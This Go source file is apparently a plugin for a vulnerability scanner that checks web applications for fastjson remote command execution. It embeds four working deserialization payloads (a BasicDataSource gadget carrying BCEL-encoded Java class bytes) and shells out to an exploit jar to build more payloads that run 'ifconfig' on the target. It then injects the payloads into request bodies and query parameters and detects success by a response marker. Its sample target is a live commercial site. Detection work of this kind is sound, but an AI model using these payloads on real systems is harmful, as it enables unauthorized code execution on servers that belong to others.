/*
url
*/
package main

import (
	"errors"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"time"

	"zeroScannerGo/engine"
	"zeroScannerGo/engine/lib/util"
	"zeroScannerGo/engine/lib/zhttp"
)

var (
	InitDnsCache = zhttp.SetDnsCache
	payloads     = []string{
		`{[{"jdsec":"zeroscanner","@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassLoader": {"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dUmW$TG$U$7e$86$q$ec$b0$y$_$GP$b7$d6$aam$b5$a0$b2$R$Q$K$81Z$vj$7d$Jh$85j$d5$b6v$d9$Mda$b3$hg7$bc$9c$f6$tx$fa$T$eaG$3f$fb$r$ed$e99$7d$f9$dc$bf$d3O$ed$87$da$3b$bb$J$q$QO$cb$81$99$9d$e7$3e$f7$ces$ef$9d$Z$fe$f8$e7$e7_$B$8ccW$87$8e$cb$i$93$3a$a6$f0$a1$g$a69ft$e41$cb1$a7$e1$p$j$iW4$7c$ac$e3$w$e69$3e$e1XP$$$d78$ae$x$d3$N$j$9f$e2$a6$gnq$dc$e6$b8$a3$a1$a0$f0E$8e$r$8e$bb$i$f78$3e$d3p_$c7$J$y$abaE$N$9fkx$c0$f1$90$e3$L$8eG$i$8f9$9ep$7c$a9$e1$x$86$ce9$d7w$a3$x$M$a9$e1$91$H$M$e9$85$a0$u$Y$fa$K$ae$_$96$aa$e5U$nW$ecU$8f$Q$3e$e7xuf$cfrd$3b$9b$8bv$r6$91$A$da$8f6$88$7f$bff$d0$97$83$aat$c4$NW$b9$5d$5e$98$9a$99$Y$l$9b$9c$k$bbtifzbj$d2$da$b0$b7$ec$d3k2$u$9f$5e$U$e5$40$ee$de$f2$x$d5$e86$81$ca$e1$ee$ea$86p$o$D$l$60$98ah$a3$Y$Kgl$7c$e2$f2$e4$d4$d3$b0$o$5d$7f$bd$bc$e5hxj$e0$h$d8$GV$e10$cc$Fr$ddJ$8ck$d2$$$8b$ed$40nZ$dbb$d5r$C$3f$S$3b$91$r$c5$b3$aa$I$p$eb$7e2$_$q$f0$cd$c0$x$K$a9$a1h$40$60$8dap$5dDu$c6$7c$UIw$b5$g$89$90$ea$a0$d4$e6$3c$db_$cf$zxv$Y$gXG$89$a1$7f$lN$Ukp$Nl$60$93$e1$ea$ff$d5$b3$y$e4$96$d7vS$7d_$8b$B$Pe$GM6$96$3e$C$N$V$D$cf$m$N$3c$B$b1$b9$Ua$r$f0C$wvo$u$92$fc$fche$b7$oZt$$GJ$92$81H$e9$efRJr$a5$a8$ecQ$e6$ca$a9dK$db$89$84$bc$ee$3bA$91x$M$99j$b46$3aMT$S$f3P$badc$Y$88$c3$b9A$ee$k$c5$aa$a3$G$aa$d82$b0$8da$D$3b$aak$D$fb$7b$5e$dfqD$rr$D_$a1$cd$bd$8cd5$K$c7$Z$ce$3aA$d9$K$w$c2$Pw$cb$95R$e0$efZ$3b$aa$5e$e3$d6$bc$a3$dc$ea$bdb8$a7b$eeXaR2$ab$UE$V$eb$s$N$7b5lT$40$95n$cf$xE$L$86$a97$edQt$c3$8a$j9$r$n$db$c7$ea$3fxt$5br$5b$v$c9$60$3b$b9$g$fd$z$a8$b0$8btE$9c$aa$94$aa$N$f5$f5$e0$f0H$e1$mk$96N$f8$be$dc$f8x$V$C$bb$a8$Km$b6$d0$9bL$ca$a7$ad$81$g$e5$d1G$8cP$5d$87$L$H$3b$3f$7b$u$e2l$d2$dcE$R$95$C$92x$b5$8d$cf$93C$3e$cdQ$a4X$f3$e8$ec$e7$92$I$U$ee$f8$9bl$f4$cc$b8$feV$b0I$c5$9ai$de$s$b9$3c$z$db$d4$a1$91$c3$Q$juU$ae$q$c3$81$c3$V$oB$3f$R$ae$J$c7$b3$a5$u$dep$85G$h$8f$feG$v$gBc$3a$858$f6$G$T$f5$94$$$ca$bc$e3$880t$e3$b6$a7$87$l$ab$X$f3$5c$9b$84$da$aa$3f$d2$q$aeQ$96$8cz$u$e8$90$O$b5SI$c13k$5e5$a4$L$9bq$bc$m$U8$83s$f4$bf$40$fdt$80$a9G$92$c6$RZ$9d$a4$99$d1$9c9$ff$p$d8$x$fa$608Ocg$MR$ddp$a1A$ed$Y$q$b4$9f$c0$X$ec$O$xd$3b$ee$fc$84T$N$e9l$a6$86$ce$c5$8bY$z$f5$Lx$N$5dK$a3$8c$be$f4$g$ba$f3$e9$3a$c3$mF$3ecf$b2$3duN$be$d3$ec4$d3$N$9afj5$f4f$fbj$e8$cfs$93$a7k8br$85e$f3$5df$972$N$u$93n$ea$b1IWX6$dfmv$x$d3$60$9aB$3eJ$N$60h$b9$86$a3y$c34$ccn$82$f4G$a9$ec1B$ba$l$s$b4$e3$ad$b4$k$b3g$8ff6$d1$deJ$E$k$cd$f7$9a$bdfw$5d$e0$ef8Q$b8p$be$86$b7$_$d4p$92$fe$dey$89$l$W$b3$a7$h$f9$9f$a1$ec$96$ea$df$ef$aaL$d3$a3$d9$f7$g$89fF$b3$ef7o$adRO7$b6$e9$a2$d43$7b$d5$e2T$T$5e$d7tVi$a2$ec5$b3$abI$c4K$a4$97$O$I$Z$ca$f7$b5$mf$dfo$af$90A$g$7f$b2$UN$b14$dba$df$e2T$bc$7eN$adK$b1$ef$e2$f99$fb$5e$cdt$W$9a$9b$7d$91$c6$i2$af$c9$b5C$c3$a8$G$LLC$ee5$3d$d1$a9d$ad$e1R$M$fd$N$dc$d50$f6$X$8e$90$dbx$ih$e2_$f1$c1$i$dc$a9$I$A$A"}]:1}`,
		`{[{"jdsec":"zeroscanner","@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource","driverClassLoader": {"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dUmW$TG$U$7e$86$q$ec$b0$y$_$GP$b7$d6$aam$b5$a0$b2$R$Q$K$81Z$vj$7d$Jh$85j$d5$b6v$d9$Mda$b3$hg7$bc$9c$f6$tx$fa$T$eaG$3f$fb$r$ed$e99$7d$f9$dc$bf$d3O$ed$87$da$3b$bb$J$q$QO$cb$81$99$9d$e7$3e$f7$ces$ef$9d$Z$fe$f8$e7$e7_$B$8ccW$87$8e$cb$i$93$3a$a6$f0$a1$g$a69ft$e41$cb1$a7$e1$p$j$iW4$7c$ac$e3$w$e69$3e$e1XP$$$d78$ae$x$d3$N$j$9f$e2$a6$gnq$dc$e6$b8$a3$a1$a0$f0E$8e$r$8e$bb$i$f78$3e$d3p_$c7$J$y$abaE$N$9fkx$c0$f1$90$e3$L$8eG$i$8f9$9ep$7c$a9$e1$x$86$ce9$d7w$a3$x$M$a9$e1$91$H$M$e9$85$a0$u$Y$fa$K$ae$_$96$aa$e5U$nW$ecU$8f$Q$3e$e7xuf$cfrd$3b$9b$8bv$r6$91$A$da$8f6$88$7f$bff$d0$97$83$aat$c4$NW$b9$5d$5e$98$9a$99$Y$l$9b$9c$k$bbtifzbj$d2$da$b0$b7$ec$d3k2$u$9f$5e$U$e5$40$ee$de$f2$x$d5$e86$81$ca$e1$ee$ea$86p$o$D$l$60$98ah$a3$Y$Kgl$7c$e2$f2$e4$d4$d3$b0$o$5d$7f$bd$bc$e5hxj$e0$h$d8$GV$e10$cc$Fr$ddJ$8ck$d2$$$8b$ed$40nZ$dbb$d5r$C$3f$S$3b$91$r$c5$b3$aa$I$p$eb$7e2$_$q$f0$cd$c0$x$K$a9$a1h$40$60$8dap$5dDu$c6$7c$UIw$b5$g$89$90$ea$a0$d4$e6$3c$db_$cf$zxv$Y$gXG$89$a1$7f$lN$Ukp$Nl$60$93$e1$ea$ff$d5$b3$y$e4$96$d7vS$7d_$8b$B$Pe$GM6$96$3e$C$N$V$D$cf$m$N$3c$B$b1$b9$Ua$r$f0C$wvo$u$92$fc$fche$b7$oZt$$GJ$92$81H$e9$efRJr$a5$a8$ecQ$e6$ca$a9dK$db$89$84$bc$ee$3bA$91x$M$99j$b46$3aMT$S$f3P$badc$Y$88$c3$b9A$ee$k$c5$aa$a3$G$aa$d82$b0$8da$D$3b$aak$D$fb$7b$5e$dfqD$rr$D_$a1$cd$bd$8cd5$K$c7$Z$ce$3aA$d9$K$w$c2$Pw$cb$95R$e0$efZ$3b$aa$5e$e3$d6$bc$a3$dc$ea$bdb8$a7b$eeXaR2$ab$UE$V$eb$s$N$7b5lT$40$95n$cf$xE$L$86$a97$edQt$c3$8a$j9$r$n$db$c7$ea$3fxt$5br$5b$v$c9$60$3b$b9$g$fd$z$a8$b0$8btE$9c$aa$94$aa$N$f5$f5$e0$f0H$e1$mk$96N$f8$be$dc$f8x$V$C$bb$a8$Km$b6$d0$9bL$ca$a7$ad$81$g$e5$d1G$8cP$5d$87$L$H$3b$3f$7b$u$e2l$d2$dcE$R$95$C$92x$b5$8d$cf$93C$3e$cdQ$a4X$f3$e8$ec$e7$92$I$U$ee$f8$9bl$f4$cc$b8$feV$b0I$c5$9ai$de$s$b9$3c$z$db$d4$a1$91$c3$Q$juU$ae$q$c3$81$c3$V$oB$3f$R$ae$J$c7$b3$a5$u$dep$85G$h$8f$feG$v$gBc$3a$858$f6$G$T$f5$94$$$ca$bc$e3$880t$e3$b6$a7$87$l$ab$X$f3$5c$9b$84$da$aa$3f$d2$q$aeQ$96$8cz$u$e8$90$O$b5SI$c13k$5e5$a4$L$9bq$bc$m$U8$83s$f4$bf$40$fdt$80$a9G$92$c6$RZ$9d$a4$99$d1$9c9$ff$p$d8$x$fa$608Ocg$MR$ddp$a1A$ed$Y$q$b4$9f$c0$X$ec$O$xd$3b$ee$fc$84T$N$e9l$a6$86$ce$c5$8bY$z$f5$Lx$N$5dK$a3$8c$be$f4$g$ba$f3$e9$3a$c3$mF$3ecf$b2$3duN$be$d3$ec4$d3$N$9afj5$f4f$fbj$e8$cfs$93$a7k8br$85e$f3$5df$972$N$u$93n$ea$b1IWX6$dfmv$x$d3$60$9aB$3eJ$N$60h$b9$86$a3y$c34$ccn$82$f4G$a9$ec1B$ba$l$s$b4$e3$ad$b4$k$b3g$8ff6$d1$deJ$E$k$cd$f7$9a$bdfw$5d$e0$ef8Q$b8p$be$86$b7$_$d4p$92$fe$dey$89$l$W$b3$a7$h$f9$9f$a1$ec$96$ea$df$ef$aaL$d3$a3$d9$f7$g$89fF$b3$ef7o$adRO7$b6$e9$a2$d43$7b$d5$e2T$T$5e$d7tVi$a2$ec5$b3$abI$c4K$a4$97$O$I$Z$ca$f7$b5$mf$dfo$af$90A$g$7f$b2$UN$b14$dba$df$e2T$bc$7eN$adK$b1$ef$e2$f99$fb$5e$cdt$W$9a$9b$7d$91$c6$i2$af$c9$b5C$c3$a8$G$LLC$ee5$3d$d1$a9d$ad$e1R$M$fd$N$dc$d50$f6$X$8e$90$dbx$ih$e2_$f1$c1$i$dc$a9$I$A$A"}]:1}`,
		`{[{"jdsec":"zeroscanner","@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource","driverClassLoader": {"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuSYS$d3P$U$fe$$$5d$Sb$Q$y$a0$d4$V$X$b0ei$a1$85$b2$8a$60$FY$K$3a$96$d1a$7c$60Bz$a1$814$c9$q$b7$I$P$ce0$fe$Z$9fy$a9$8e3$3a$3e$fb$87$7cs$3ci$8b$94$z$P$e7$9e$7c$df$d9$cf$9c$df$7f$bf$ff$E$90$c2$b2$82$Wt$xx$88G$bex$y$e3$89$82$k$f4$cax$w$p$s$n$ae$40F$9f$8c$7e$J$D2$G$r$q$U$q1$qcXBJFZA$hF$7c1$ea$8b$8c$841$J$e3$M$e1i$c32$c4$MC$m$W$7f$c7$Q$cc$da$F$ce$d0$9a3$y$beV$$mqw$5d$db2$J$91$a7u$b3n$d9$92$X$9a$be$b7$aa9U$8a$C1$uy$bb$ec$ea$7c$c1$f0MG$b2$99$89L$3a$3d6$9e$Z$gK$8d$a6R$e9$c4$ae$b6$afuo$bbv$a9$7b$95$97l$f7p$c9r$cab$99$40$df$e1$f5$d6$$$d7$85$8a$5b$e8$920$a1b$SS$w$a6$f1$8c$a1G$b7K$J$db$e1$96wXr$8a$b6u$988$f8h$bb$7b$a9$c4$9c$$$M$db$ca$da$96$e0$HB$c2$8c$8a$e7$98e$e8$f5$f3$i$q$3c$ee$ee$9b$5c$q$8aB8$89E$S$f9$g$f0$96$7b$8emyT$a1$b2$c3E$dd$9bz$f5$bd$92$a6f$ed$q$b3$a6$e6y$w$e6$f0$82$e6A6$Mm$a7d$5e$b8$86$b5$c3$d0L$c4$7b$d7$Q$dc$3dC$d7$da$90$90U$f1$S$f3$M$99$ab$8a$_$Y$9e$a3$J$bd$c8$dd$cb$8bk$af$c64$ec$e4$h$ca$d7$90$a9$e0q$7d8$95$k$Z$cdlnz$o$a5b$B$afT$y$a2K$c5$S$baN$fc$aa$b5$cc$l$e8$dc$f1GD$7e$e7$97q$a6$e8$f5$a2$cb$b5$C$adT$_$bb$$$b7$c4$c9$7fG$y$9e$3bo5$c5$d0y$3a$b7$ea$a8r$b6V$f0$8b$8b$9e1o$a0$7c$9fK$J$g$a3IJ$V$a1E$c7r$e7$e7$3cu$n$e2Tm$f4$ab$5c$Um$wq$f6$S$9f$P$X$7c$g$a3$b8$7c$db$a4$V$rk$R$u$5c$d7U$i$9d$85a$ed$db$7b$b4$8d$89$c64$b5$j$9fIS$87$e2$X$n$86$90$e3o$90FpY$7btl$a1m$b3$ec$V$e9$d5M$db$e3t$d47$e9$c4$fd$af$J$cc$3f$H$92Q$fa$bbG$_$a37$d4$f7$V$ec$98$U$86$db$q$c3U$90$$$Tw$fe$9b$k$T$w$d3$fb$f9$h$9a$w$ID$82$V$84V$eaz$98$f4$5c_D$K$fc$80$5cA$f3j_D$J$92$ba$Rh$c7$b5$3c$Bk$fd$R$b5$ceM$G$H$Y$a9$z$V$5c$9f$M$NFCd$d7$b2$R$88$b4$e6$7d$m$i$NF$c3u$f6$X$da$s$a5$a8$U$b9QA$q$wU$d0$ee$8b$8e$_$I$ae$iW$ab$fb$84$ptR$3b$8d$f5$de$r$d9$8c$a6$3f8$92$a85$C$eeW$3b$7e$f0$P$D$40$fd_$ea$E$A$A"}]:1}`,
		`{[{"jdsec":"zeroscanner","@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassLoader": {"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuSYS$d3P$U$fe$$$5d$Sb$Q$y$a0$d4$V$X$b0ei$a1$85$b2$8a$60$FY$K$3a$96$d1a$7c$60Bz$a1$814$c9$q$b7$I$P$ce0$fe$Z$9fy$a9$8e3$3a$3e$fb$87$7cs$3ci$8b$94$z$P$e7$9e$7c$df$d9$cf$9c$df$7f$bf$ff$E$90$c2$b2$82$Wt$xx$88G$bex$y$e3$89$82$k$f4$cax$w$p$s$n$ae$40F$9f$8c$7e$J$D2$G$r$q$U$q1$qcXBJFZA$hF$7c1$ea$8b$8c$841$J$e3$M$e1i$c32$c4$MC$m$W$7f$c7$Q$cc$da$F$ce$d0$9a3$y$beV$$mqw$5d$db2$J$91$a7u$b3n$d9$92$X$9a$be$b7$aa9U$8a$C1$uy$bb$ec$ea$7c$c1$f0MG$b2$99$89L$3a$3d6$9e$Z$gK$8d$a6R$e9$c4$ae$b6$afuo$bbv$a9$7b$95$97l$f7p$c9r$cab$99$40$df$e1$f5$d6$$$d7$85$8a$5b$e8$920$a1b$SS$w$a6$f1$8c$a1G$b7K$J$db$e1$96wXr$8a$b6u$988$f8h$bb$7b$a9$c4$9c$$$M$db$ca$da$96$e0$HB$c2$8c$8a$e7$98e$e8$f5$f3$i$q$3c$ee$ee$9b$5c$q$8aB8$89E$S$f9$g$f0$96$7b$8emyT$a1$b2$c3E$dd$9bz$f5$bd$92$a6f$ed$q$b3$a6$e6y$w$e6$f0$82$e6A6$Mm$a7d$5e$b8$86$b5$c3$d0L$c4$7b$d7$Q$dc$3dC$d7$da$90$90U$f1$S$f3$M$99$ab$8a$_$Y$9e$a3$J$bd$c8$dd$cb$8bk$af$c64$ec$e4$h$ca$d7$90$a9$e0q$7d8$95$k$Z$cdlnz$o$a5b$B$afT$y$a2K$c5$S$baN$fc$aa$b5$cc$l$e8$dc$f1GD$7e$e7$97q$a6$e8$f5$a2$cb$b5$C$adT$_$bb$$$b7$c4$c9$7fG$y$9e$3bo5$c5$d0y$3a$b7$ea$a8r$b6V$f0$8b$8b$9e1o$a0$7c$9fK$J$g$a3IJ$V$a1E$c7r$e7$e7$3cu$n$e2Tm$f4$ab$5c$Um$wq$f6$S$9f$P$X$7c$g$a3$b8$7c$db$a4$V$rk$R$u$5c$d7U$i$9d$85a$ed$db$7b$b4$8d$89$c64$b5$j$9fIS$87$e2$X$n$86$90$e3o$90FpY$7btl$a1m$b3$ec$V$e9$d5M$db$e3t$d47$e9$c4$fd$af$J$cc$3f$H$92Q$fa$bbG$_$a37$d4$f7$V$ec$98$U$86$db$q$c3U$90$$$Tw$fe$9b$k$T$w$d3$fb$f9$h$9a$w$ID$82$V$84V$eaz$98$f4$5c_D$K$fc$80$5cA$f3j_D$J$92$ba$Rh$c7$b5$3c$Bk$fd$R$b5$ceM$G$H$Y$a9$z$V$5c$9f$M$NFCd$d7$b2$R$88$b4$e6$7d$m$i$NF$c3u$f6$X$da$s$a5$a8$U$b9QA$q$wU$d0$ee$8b$8e$_$I$ae$iW$ab$fb$84$ptR$3b$8d$f5$de$r$d9$8c$a6$3f8$92$a85$C$eeW$3b$7e$f0$P$D$40$fd_$ea$E$A$A"}]:1}`,
	}
	command  = "java -jar source/fastjson_rce.jar %s %s"
	payloadP = regexp.MustCompile(`\{[^\n]+\}`)
)

func Verify(params engine.Params) (result engine.Result) {
	newPayloads := append([]string{}, payloads...)
	m, perr := makePayload(params.TargetId, "ifconfig")
	if perr == nil {
		newPayloads = append(newPayloads, m...)
	}
	defer func() {
		if perr != nil {
			result.Err = perr.Error()
		}
	}()

	var err error
	for _, data := range dataToPayload(params.Data, newPayloads) {
		params.Data = data
		result, err = checkVul(params)
		if err != nil || result.Vul {
			return
		}
	}
	for _, query := range dataToPayload(params.ParsedTarget.Query().Encode(), newPayloads) {
		params.ParsedTarget.RawQuery = query
		result, err = checkVul(params)
		if err != nil || result.Vul {
			return
		}
	}

	return
}

func makePayload(targetId, cmd string) ([]string, error) {
	c := fmt.Sprintf(command, targetId, cmd)
	stdout, stderr, err := util.Exec(c, time.Second*60)
	if err != nil {
		return nil, errors.New("[stdout]\n" + stdout + "\n[stderr]\n" + stderr + "\n[err]\n" + err.Error())
	}
	return payloadP.FindAllString(stdout, 2), nil
}

func checkVul(params engine.Params) (result engine.Result, err error) {
	var resp *zhttp.Response
	resp, err = zhttp.Request(params.Method, params.ParsedTarget.String(), &zhttp.RequestOptions{
		DialTimeout:        time.Second * 5,
		RequestTimeout:     time.Second * 5,
		RawCookie:          params.Cookie,
		Hosts:              params.Hosts,
		InsecureSkipVerify: true,
		DisableRedirect:    true,
		RawData:            params.Data,
		ContentType:        params.ContentType,
	})
	if err != nil {
		return
	}
	if strings.Contains(resp.String(), "jdsec123456") {
		result.Vul = true
		result.VulUrl = params.ParsedTarget.String()
		result.RawReq = resp.RawRequest()
		result.VulInfo = "fastjson远程命令执行"
	}
	resp.Close()
	return
}

func dataToPayload(data string, payloads []string) []string {
	var result []string
	if data == "" {
		return result
	}
	if strings.HasPrefix(data, "{") && strings.HasSuffix(data, "}") {
		for _, payload := range payloads {
			result = append(result, payload)
		}
	} else if strings.HasPrefix(data, "[") && strings.HasSuffix(data, "]") {
		for _, payload := range payloads {
			result = append(result, "["+payload+"]")
		}
	} else {
		query, err := url.ParseQuery(data)
		if err != nil {
			return result
		}
		for k, v := range query {
			for i, item := range v {
				var prefix, suffix string
				if strings.HasPrefix(item, "{") && strings.HasSuffix(item, "}") {
					prefix = ""
					suffix = ""
				} else if strings.HasPrefix(item, "[") && strings.HasSuffix(item, "]") {
					prefix = "["
					suffix = "]"
				} else {
					continue
				}
				for _, payload := range payloads {
					query[k][i] = prefix + payload + suffix
					result = append(result, query.Encode())
					query[k][i] = item
				}
			}
		}
	}
	return result
}

func main() {
	params := engine.Params{}
	params.Method = "GET"
	params.Target = "https://www.jd.com/?a={}&b=[]&c=1"
	parsedTarget, _ := url.Parse(params.Target)
	params.ParsedTarget = *parsedTarget
	params.Cookie = "a=1;b=2"
	params.TargetId = "testid"

	result := Verify(params)
	fmt.Printf("%+v\r\n", result)
}
